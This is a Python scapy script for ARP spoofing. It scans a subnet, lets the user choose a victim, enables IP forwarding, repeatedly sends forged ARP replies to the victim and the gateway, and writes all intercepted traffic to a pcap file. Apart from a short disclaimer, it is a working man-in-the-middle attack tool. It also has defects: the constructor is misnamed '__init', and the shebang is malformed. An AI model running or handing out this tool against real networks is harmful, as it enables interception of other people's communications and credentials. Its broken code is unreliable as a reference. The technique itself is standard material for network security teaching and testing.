#!/user/bin python3

# Disclaimer: This script is for educational purposes only.
# Do not use against any network that you don't own or have authorization to test.
# To run this script use:
# sudo python3 arp_spoof.py -ip_range 10.0.0.0/24 (ex. 192.168.1.0/24)
# original script by David Bomber

import scapy.all as scapy
import subprocess
import sys
import time
import os
from ipaddress import IPv4Network
import threading


class sniffer:
    cwd = os.getcwd()

    def __init(self):
        self.sudo()
        self.ip_range = self.get_cmd_arguments()

        if not self.ip_range:
            raise error("No valid ip range specified!")

        self.allow_ip_forwarding()
        self.arp_res = self.arp_scan(self.ip_range)

        if len(self.arp_res) == 0:
            raise error("No devices found!")

        gateways = self.gateway_info(self.arp_res)
        self.gateway_info = gateways[0]
        self.info = self.clients(self.arp_res, gateways)

        if len(self.info) == 0:
            raise Exception(
                "No clients found when sending the ARP messages. Exiting, make sure devices are active or turned on.")

        self.choice = self.print_arp_res(self.info)

        self.node_to_spoof = self.info[self.choice]

        t1 = threading.Thread(target=self.send_spoof_packets, daemon=True)
        t1.start()

        os.chdir(sniffer.cwd)

        self.packet_sniffer(self.gateway_info["iface"])

    @staticmethod
    def sudo():
        """If the user doesn't run the program with super user privileges, don't allow them to continue."""
        if 'SUDO_UID' not in os.environ.keys():
            raise error("Must run script as sudo!")

    @staticmethod
    def arp_scan(ip_range: str):
        """We use the arping method in scapy. It is a better implementation than writing your own arp scan. You'll often
        see that your own arp scan doesn't pick up mobile devices. You can see the way scapy implemented the function
        here: https://github.com/secdev/scapy/blob/master/scapy/layers/l2.py#L726-L749 Arguments: ip_range -> an example
        would be "10.0.0.0/24"
        """
        # We send arp packets through the network, verbose is set to 0 so it won't show any output.
        # scapy's arping function returns two lists. We're interested in the answered results which is at the 0 index.
        answered_lst = scapy.arping(ip_range, verbose=0)[0]

        # We return the list of arp responses which contains dictionaries for every arp response.
        return [{"ip": res[1].psrc, "mac": res[1].hwsrc} for res in answered_lst]

    @staticmethod
    def get_cmd_arguments():
        """ This function validates the command line arguments supplied on program start-up"""
        ip_range = None
        # Ensure that they supplied the correct command line arguments.
        if len(sys.argv) > 1:
            if sys.argv[1] != "-ip_range":
                print("-ip_range flag not specified.")
                return ip_range
            else:
                try:
                    # If IPv4Network(3rd paramater is not a valid ip range, then will kick you to the except block.)
                    print(f"{IPv4Network(sys.argv[2])}")
                    # If it is valid it will assign the ip_range from the 3rd parameter.
                    ip_range = sys.argv[2]
                    print("Valid ip range entered through command-line.")
                except:
                    print("Invalid command-line argument supplied.")

        return ip_range

    @staticmethod
    def allow_ip_forwarding():
        """ Run this function to allow ip forwarding. The packets will flow through your machine, and you'll be able
        to capture them. Otherwise user will lose connection. """
        # You would normally run the command sysctl -w net.ipv4.ip_forward=1 to enable ip forwarding. We run this
        # with subprocess.run()
        subprocess.run(["sysctl", "-w", "net.ipv4.ip_forward=1"])
        # Load  in sysctl settings from the /etc/sysctl.conf file.
        subprocess.run(["sysctl", "-p", "/etc/sysctl.conf"])

    def gateway_info(self, network_info):
        """We can see the gateway by running the route -n command. This get us the gateway information. We also need the name of the interface for the sniffer function.
            Arguments: network_info -> We supply the arp_scan() data.
        """
        # We run route -n and capture the output.
        result = subprocess.run(["route", "-n"], capture_output=True).stdout.decode().split("\n")
        # We declare an empty list for the gateways.
        gateways = []
        # We supplied the arp_scan() results (which is a list) as an argument to the network_info parameter.
        for iface in network_info:
            for row in result:
                # We want the gateway information to be saved to list called gateways. We know the ip of the gateway
                # so we can compare and see in which row it appears.
                if iface["ip"] in row:
                    iface_name = self.match_iface_name(row)
                    # Once we found the gateway, we create a dictionary with all of its names.
                    gateways.append({"iface": iface_name, "ip": iface["ip"], "mac": iface["mac"]})

        return gateways

    @staticmethod
    def clients(arp_res, gateway_res):
        """This function returns a list with only the clients. The gateway is removed from the list. Generally you did get the ARP response from the gateway at the 0 index
           but I did find that sometimes this may not be the case.
           Arguments: arp_res (The response from the ARP scan), gateway_res (The response from the gatway_info function.)
        """
        # In the menu we only want to give you access to the clients whose arp tables you want to poison. The gateway
        # needs to be removed.
        client_list = []
        for gateway in gateway_res:
            for item in arp_res:
                # All items which are not the gateway will be appended to the client_list.
                if gateway["ip"] != item["ip"]:
                    client_list.append(item)
        # return the list with the clients which will be used for the menu.
        return client_list

    @staticmethod
    def print_arp_res(arp_res):
        """ This function creates a menu where you can pick the device whose arp cache you want to poison. """
        print("ID\t\tIP\t\t\tMAC Address")
        print("_________________________________________________________")
        for id, res in enumerate(arp_res):
            # We are formatting the to print the id (number in the list), the ip and lastly the mac address.
            print(f"{id}\t\t{res['ip']}\t\t{res['mac']}")
        while True:
            try:
                # We have to verify the choice. If the choice is valid then the function returns the choice.
                choice = int(
                    input("Please select the ID of the computer whose ARP cache you want to poison (ctrl+z to exit): "))
                if arp_res[choice]:
                    return choice
            except TypeError:
                print("Please enter a valid choice!")

    def send_spoof_packets(self):
        # We need to send spoof packets to the gateway and the target device.
        while True:
            # We send an arp packet to the gateway saying that we are the the target machine.
            self.arp_spoofer(self.gateway_info["ip"], self.gateway_info["mac"], self.node_to_spoof["ip"])
            # We send an arp packet to the target machine saying that we are gateway.
            self.arp_spoofer(self.node_to_spoof["ip"], self.node_to_spoof["mac"], self.gateway_info["ip"])
            # Tested time.sleep() with different values. 3s seems adequate.
            time.sleep(3)

    def packet_sniffer(self, interface):
        """ This function will be a packet sniffer to capture all the packets sent to the computer whilst this
        computer is the MITM. """
        # We use the sniff function to sniff the packets going through the gateway interface. We don't store them as
        # it takes a lot of resources. The process_sniffed_pkt is a callback function that will run on each packet.
        self.packets = scapy.sniff(iface=interface, store=False, prn=self.process_sniffed_pkt)

    @staticmethod
    def arp_spoofer(target_ip, target_mac, spoof_ip):
        """ To update the ARP tables this function needs to be ran twice. Once with the gateway ip and mac, and then with the ip and mac of the target.
        Arguments: target ip address, target mac, and the spoof ip address.
        """
        # We want to create an ARP response, by default op=1 which is "who-has" request, to op=2 which is a "is-at"
        # response packet. We can fool the ARP cache by sending a fake packet saying that we're at the router's ip to
        # the target machine, and sending a packet to the router that we are at the target machine's ip.
        pkt = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
        # ARP is a layer 3 protocol. So we use scapy.send(). We choose it to be verbose so we don't see the output.
        scapy.send(pkt, verbose=False)

    def match_iface_name(self, row):
        # We get all the interface names by running the function defined above with the
        interface_names = self.get_interface_names()

        # Check if the interface name is in the row. If it is then we return the iface name.
        for iface in interface_names:
            if iface in row:
                return iface

    @staticmethod
    def get_interface_names():
        """The interface names of a networks are listed in the /sys/class/net folder in Kali. This function returns a
        list of interfaces in Kali. """
        # The interface names are directory names in the /sys/class/net folder. So we change the directory to go there.
        os.chdir("/sys/class/net")
        # We return the interface names which we will use to find out which one is the name of the gateway.
        return os.listdir()

    @staticmethod
    def process_sniffed_pkt(pkt):
        """ This function is a callback function that works with the packet sniffer. It receives every packet that
        goes through scapy.sniff(on_specified_interface) and writes it to a pcap file """
        print("Writing to pcap file. Press ctrl + c to exit.")
        # We append every packet sniffed to the requests.pcap file which we can inspect with Wireshark.
        scapy.wrpcap("requests.pcap", pkt, append=True)


# get_interface_names()
class error(Exception):
    def __init__(self, error):
        self.error = error
        super().__init__(self.error)
